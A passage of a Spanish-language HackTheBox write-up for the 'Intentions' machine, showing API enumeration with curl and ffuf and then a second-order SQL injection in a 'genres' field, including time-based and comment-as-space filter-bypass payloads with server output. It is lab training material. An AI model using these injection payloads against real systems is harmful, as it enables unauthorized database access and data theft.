+</code></pre></div><p>Nótese que no usé <code>Content-Type</code> en la primera petición y el servidor me dijo qué valores faltaban. Si hago lo mismo en <code>v2</code>, <code>password</code> se reemplaza por <code>hash</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v2/auth/login -d <span class="code-dark-yellow">'{"email":"asdf@asdf.com","password":"asdffdsa"}'</span>
+{"status":"error","errors":{"email":["The email field is required."],"hash":["The hash field is required."]}}  
+</code></pre></div><p>Podemos intentar registrar una nueva cuenta en <code>v2</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v2/auth/register -d <span class="code-dark-yellow">''</span>
+{"status":"error","errors":{"name":["The name field is required."],"email":["The email field is required."],"password":["The password field is required."]}}  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v2/auth/register -d <span class="code-dark-yellow">'{"name":"asdf","email":"fdsa@asdf.com","password":"asdffdsa"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
+{"status":"error","errors":{"password":["The password confirmation does not match."]}}
+</code></pre></div><p>Parece que necesitamos poner un campo de confirmación de contraseña. Nuevamente, Burp Suite captará la petición y mostrará que el campo se llama <code>password_confirmation</code> (aunque para <code>v1</code>):</p><p><img src="/images/HTB/Intentions/Intentions-12.webp" alt="Intentions 12"></p><p>Entonces, podemos registrarnos en <code>v2</code>, pero no podemos iniciar sesión:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v2/auth/register -d <span class="code-dark-yellow">'{"name":"asdf","email":"fdsa@asdf.com","password":"asdffdsa","password_confirmation":"asdffdsa"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
+{"status":"success"}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v2/auth/login -d <span class="code-dark-yellow">'{"email":"fdsa@asdf.com","hash":"asdffdsa"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
+{"error":"login_error"}
+</code></pre></div><p>Tal vez <code>hash</code> sea realmente un <em>hash</em> (MD5, SHA256 &mldr;), pero no sabemos cómo se construye.</p><p>También podemos intentar aplicar <em>fuzzing</em> a la API en <code>v2</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://10.10.11.220/api/v2/auth/FUZZ -fs 162  
+
+<span class="code-dark-blue">[Status: 302, Size: 330, Words: 60, Lines: 12, Duration: 67ms]</span>
+    * FUZZ: user
+
+<span class="code-dark-yellow">[Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 77ms]</span>
+    * FUZZ: register
+
+<span class="code-dark-yellow">[Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 95ms]</span>
+    * FUZZ: login
+
+<span class="code-dark-yellow">[Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 90ms]</span>
+    * FUZZ: logout
+
+<span class="code-dark-red">[Status: 500, Size: 6615, Words: 443, Lines: 37, Duration: 400ms]</span>
+    * FUZZ: refresh
+</code></pre></div><p>De nuevo, nada realmente útil.</p><p>Veamos qué información se almacena sobre los usuarios:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/auth/user -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span> | <span class="code-dark-green">jq</span>  
+<span class="code-white">{</span>
+  <span class="code-blue">"status"</span><span class="code-white">: </span><span class="code-dark-green">"success"</span><span class="code-white">,</span>
+  <span class="code-blue">"data"</span><span class="code-white">: {</span>
+    <span class="code-blue">"id"</span><span class="code-white">: </span>28<span class="code-white">,</span>
+    <span class="code-blue">"name"</span><span class="code-white">: </span><span class="code-dark-green">"asdf"</span><span class="code-white">,</span>
+    <span class="code-blue">"email"</span><span class="code-white">: </span><span class="code-dark-green">"asdf@asdf.com"</span><span class="code-white">,</span>
+    <span class="code-blue">"created_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T21:44:12.000000Z"</span><span class="code-white">,</span>
+    <span class="code-blue">"updated_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T21:44:12.000000Z"</span><span class="code-white">,</span>
+    <span class="code-blue">"admin"</span><span class="code-white">: </span>0<span class="code-white">,</span>
+    <span class="code-blue">"genres"</span><span class="code-white">: </span><span class="code-dark-green">"food,travel,nature"</span>
+<span class="code-white">  }</span>
+<span class="code-white">}</span>
+</code></pre></div><p>Bueno, volvamos a los archivos de JavaScript y veamos si hay llamadas a la API:</p><p><img src="/images/HTB/Intentions/Intentions-13.webp" alt="Intentions 13"></p><p>Podemos encontrar</p><ul><li>POST <code>/api/v1/gallery/user/genres</code></li><li>GET <code>/api/v1/gallery/user/feed</code></li><li>GET <code>/api/v1/gallery/images</code></li><li>GET <code>/api/v1/auth/user</code></li></ul><p>Esto es interesante:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/gallery/user/genres -d <span class="code-dark-yellow">''</span> -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span>  
+{"status":"success"}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/auth/user -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span> | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"status"</span><span class="code-white">: </span><span class="code-dark-green">"success"</span><span class="code-white">,</span>
+  <span class="code-blue">"data"</span><span class="code-white">: {</span>
+    <span class="code-blue">"id"</span><span class="code-white">: </span>28<span class="code-white">,</span>
+    <span class="code-blue">"name"</span><span class="code-white">: </span><span class="code-dark-green">"asdf"</span><span class="code-white">,</span>
+    <span class="code-blue">"email"</span><span class="code-white">: </span><span class="code-dark-green">"asdf@asdf.com"</span><span class="code-white">,</span>
+    <span class="code-blue">"created_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T21:44:12.000000Z"</span><span class="code-white">,</span>
+    <span class="code-blue">"updated_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T22:43:53.000000Z"</span><span class="code-white">,</span>
+    <span class="code-blue">"admin"</span><span class="code-white">: </span>0<span class="code-white">,</span>
+    <span class="code-blue">"genres"</span><span class="code-white">: </span><span class="code-dark-green">""</span>
+<span class="code-white">  }</span>
+<span class="code-white">}</span>
+</code></pre></div><p>Acabo de borrar mi campo <code>genres</code>&mldr; puedo controlar este campo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/gallery/user/genres -d <span class="code-dark-yellow">'{"genres":"asdf"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span>  
+{"status":"success"}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/auth/user -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span> | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"status"</span><span class="code-white">: </span><span class="code-dark-green">"success"</span><span class="code-white">,</span>
+  <span class="code-blue">"data"</span><span class="code-white">: </span>{</span>
+    <span class="code-blue">"id"</span><span class="code-white">: </span></span>28<span class="code-white">,</span>
+    <span class="code-blue">"name"</span><span class="code-white">: </span><span class="code-dark-green">"asdf"<span class="code-white">,</span>
+    <span class="code-blue">"email"</span><span class="code-white">: </span><span class="code-dark-green">"asdf@asdf.com"<span class="code-white">,</span>
+    <span class="code-blue">"created_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T21:44:12.000000Z"<span class="code-white">,</span>
+    <span class="code-blue">"updated_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T22:45:10.000000Z"<span class="code-white">,</span>
+    <span class="code-blue">"admin"</span><span class="code-white">: </span></span>0<span class="code-white">,</span>
+    <span class="code-blue">"genres"</span><span class="code-white">: </span><span class="code-dark-green">"asdf"</span>
+<span class="code-white">  }</span>
+<span class="code-white">}</span>
+</code></pre></div><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Este parámetro parece interesante, intentemos inyectar código SQL:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/gallery/user/genres -d <span class="code-dark-yellow">$'{"genres":"<span class="code-dark-cyan">\'</span>"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span>  
+{"status":"success"}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/auth/user -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span> | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"status"</span><span class="code-white">: </span><span class="code-dark-green">"success"</span><span class="code-white">,</span>
+  <span class="code-blue">"data"</span><span class="code-white">: </span>{</span>
+    <span class="code-blue">"id"</span><span class="code-white">: </span></span>28<span class="code-white">,</span>
+    <span class="code-blue">"name"</span><span class="code-white">: </span><span class="code-dark-green">"asdf"</span><span class="code-white">,</span>
+    <span class="code-blue">"email"</span><span class="code-white">: </span><span class="code-dark-green">"asdf@asdf.com"</span><span class="code-white">,</span>
+    <span class="code-blue">"created_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T21:44:12.000000Z"</span><span class="code-white">,</span>
+    <span class="code-blue">"updated_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T23:18:30.000000Z"</span><span class="code-white">,</span>
+    <span class="code-blue">"admin"</span><span class="code-white">: </span></span>0<span class="code-white">,</span>
+    <span class="code-blue">"genres"</span><span class="code-white">: </span><span class="code-dark-green">"'"</span>
+<span class="code-white">  }</span>
+<span class="code-white">}</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/gallery/user/feed -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span> | <span class="code-dark-green">grep</span> Error
+        &lt;title&gt;Server <span class="code-red">Error</span>&lt;/title&gt;
+                        Server <span class="code-red">Error</span>                    &lt;/div&gt;
+</code></pre></div><p>El servidor se ha bloqueado al llamar a <code>/api/v1/gallery/user/feed</code>. Esto significa que la inyección ha funcionado (SQLi de segundo orden).</p><h3 id="inyección-de-código-sql">Inyección de código SQL</h3><p>Usemos un <em>payload</em> de SQLi típico:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/gallery/user/genres -d <span class="code-dark-yellow">$'{"genres":"<span class="code-dark-cyan">\'</span> or sleep(5);-- -"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span>  
+{"status":"success"}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v2/auth/user -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span> | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"status"</span><span class="code-white">: </span><span class="code-dark-green">"success"</span><span class="code-white">,</span>
+  <span class="code-blue">"data"</span><span class="code-white">: {</span>
+    <span class="code-blue">"id"</span><span class="code-white">: </span>28<span class="code-white">,</span>
+    <span class="code-blue">"name"</span><span class="code-white">: </span><span class="code-dark-green">"asdf"</span><span class="code-white">,</span>
+    <span class="code-blue">"email"</span><span class="code-white">: </span><span class="code-dark-green">"asdf@asdf.com"</span><span class="code-white">,</span>
+    <span class="code-blue">"created_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T21:44:12.000000Z"</span><span class="code-white">,</span>
+    <span class="code-blue">"updated_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T22:51:32.000000Z"</span><span class="code-white">,</span>
+    <span class="code-blue">"admin"</span><span class="code-white">: </span></span>0<span class="code-white">,</span>
+    <span class="code-blue">"genres"</span><span class="code-white">: </span><span class="code-dark-green">"'orsleep(5);---"</span>
+<span class="code-white">  }</span>
+<span class="code-white">}</span>
+</code></pre></div><p>Vemos que se eliminan los espacios&mldr; pero podemos evitarlo usando comentarios como espacios:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/gallery/user/genres -d <span class="code-dark-yellow">$'{"genres":"<span class="code-dark-cyan">\'</span>)/**/or/**/(<span class="code-dark-cyan">\'</span>1<span class="code-dark-cyan">\'</span>=<span class="code-dark-cyan">\'</span>1"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span>
+{"status":"success"}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v2/auth/user -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span> | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"status"</span><span class="code-white">: </span><span class="code-dark-green">"success"</span><span class="code-white">,</span>
+  <span class="code-blue">"data"</span><span class="code-white">: {</span>
+    <span class="code-blue">"id"</span><span class="code-white">: </span>28<span class="code-white">,</span>
+    <span class="code-blue">"name"</span><span class="code-white">: </span><span class="code-dark-green">"asdf"</span><span class="code-white">,</span>
+    <span class="code-blue">"email"</span><span class="code-white">: </span><span class="code-dark-green">"asdf@asdf.com"</span><span class="code-white">,</span>
+    <span class="code-blue">"created_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T21:44:12.000000Z"</span><span class="code-white">,</span>
+    <span class="code-blue">"updated_at"</span><span class="code-white">: </span><span class="code-dark-green">"2023-07-03T22:51:32.000000Z"</span><span class="code-white">,</span>
+    <span class="code-blue">"admin"</span><span class="code-white">: </span></span>0<span class="code-white">,</span>
+    <span class="code-blue">"genres"</span><span class="code-white">: </span><span class="code-dark-green">"')/**/or/**/('1'='1"</span>
+<span class="code-white">  }</span>
+<span class="code-white">}</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/gallery/user/feed -sH <span class="code-dark-yellow">'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1OS4yNTIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg0MjMzMTgsImV4cCI6MTY4ODQ0NDkxOCwibmJmIjoxNjg4NDIzMzE4LCJqdGkiOiJmckIyRUhQZkpNYmM2Q1dSIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.CfN6TLIWNrzUy26NFekbgAME2Kj4_LAW5QEcYT05jy8'</span>
+{"status":"success","data":[{"id":1,"file":"public\/animals\/ashlee-w-wv36v9TGNBw-unsplash.jpg","genre":"animals","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/animals\/ashlee-w-wv36v9TGNBw-unsplash.jpg"},{"id":2,"file":"public\/animals\/dickens-lin-Nr7QqJIP8Do-unsplash.jpg","genre":"animals","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/animals\/dickens-lin-Nr7QqJIP8Do-unsplash.jpg"},{"id":3,"file":"public\/animals\/dickens-lin-tycqN7-MY1s-unsplash.jpg","genre":"animals","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/animals\/dickens-lin-tycqN7-MY1s-unsplash.jpg"},{"id":4,"file":"public\/animals\/jevgeni-fil-rz2Nh0U8vws-unsplash.jpg","genre":"animals","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/animals\/jevgeni-fil-rz2Nh0U8vws-unsplash.jpg"},{"id":5,"file":"public\/animals\/kristin-o-karlsen-u8aXoDEcDR0-unsplash.jpg","genre":"animals","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/animals\/kristin-o-karlsen-u8aXoDEcDR0-unsplash.jpg"},{"id":6,"file":"public\/architecture\/axp-photography-EU1sTG7DGxE-unsplash.jpg","genre":"architecture","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/architecture\/axp-photography-EU1sTG7DGxE-unsplash.jpg"},{"id":7,"file":"public\/architecture\/k-t-francis-kHm0iLOj2zg-unsplash.jpg","genre":"architecture","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/architecture\/k-t-francis-kHm0iLOj2zg-unsplash.jpg"},{"id":8,"file":"public\/architecture\/leopold-baskarad-BcIr38tPxJ8-unsplash.jpg","genre":"architecture","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/architecture\/leopold-baskarad-BcIr38tPxJ8-unsplash.jpg"},{"id":9,"file":"public\/architecture\/nico-baum-LudJh7dPfv4-unsplash.jpg","genre":"architecture","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/architecture\/nico-baum-LudJh7dPfv4-unsplash.jpg"},{"id":10,"file":"public\/food\/anto-meneghini-sJ4ix9_AjAc-unsplash.jpg","genre":"food","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/food\/anto-meneghini-sJ4ix9_AjAc-unsplash.jpg"},{"id":11,"file":"public\/food\/dan-9-f4enU0AY0-unsplash.jpg","genre":"food","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/food\/dan-9-f4enU0AY0-unsplash.jpg"},{"id":12,"file":"public\/food\/fatemeh-rz--RqVu65QrTM-unsplash.jpg","genre":"food","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/food\/fatemeh-rz--RqVu65QrTM-unsplash.jpg"},{"id":13,"file":"public\/food\/jonathan-borba-BMpBW2476wQ-unsplash.jpg","genre":"food","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/food\/jonathan-borba-BMpBW2476wQ-unsplash.jpg"},{"id":14,"file":"public\/food\/rod-long--LMw-y4gxac-unsplash.jpg","genre":"food","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/food\/rod-long--LMw-y4gxac-unsplash.jpg"},{"id":15,"file":"public\/nature\/edoardo-botez-rm8q_Gy2iJs-unsplash.jpg","genre":"nature","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/nature\/edoardo-botez-rm8q_Gy2iJs-unsplash.jpg"},{"id":16,"file":"public\/nature\/laura-adai-mxGR7FogG10-unsplash.jpg","genre":"nature","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/nature\/laura-adai-mxGR7FogG10-unsplash.jpg"},{"id":17,"file":"public\/nature\/marek-piwnicki-urmnC74otpA-unsplash.jpg","genre":"nature","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/nature\/marek-piwnicki-urmnC74otpA-unsplash.jpg"},{"id":18,"file":"public\/nature\/marek-piwnicki-VOv4uaMf9E4-unsplash.jpg","genre":"nature","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/nature\/marek-piwnicki-VOv4uaMf9E4-unsplash.jpg"},{"id":19,"file":"public\/nature\/rafael-garcin-GsQ0iSb88HY-unsplash.jpg","genre":"nature","created_at":"2023-02-02T17:41:52.000000Z","updated_at":"2023-02-02T17:41:52.000000Z","url":"\/storage\/nature\/rafael-garcin-GsQ0iSb88HY-unsplash.jpg"}]}  
+</code></pre></div><p>Genial, parece que hemos encontrado el formato de la inyección y el punto. Vamos a envolver todo el proceso en una función de <em>shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">function</span> sqli<span class="code-dark-yellow">()</span> <span class="code-dark-yellow">{</span>
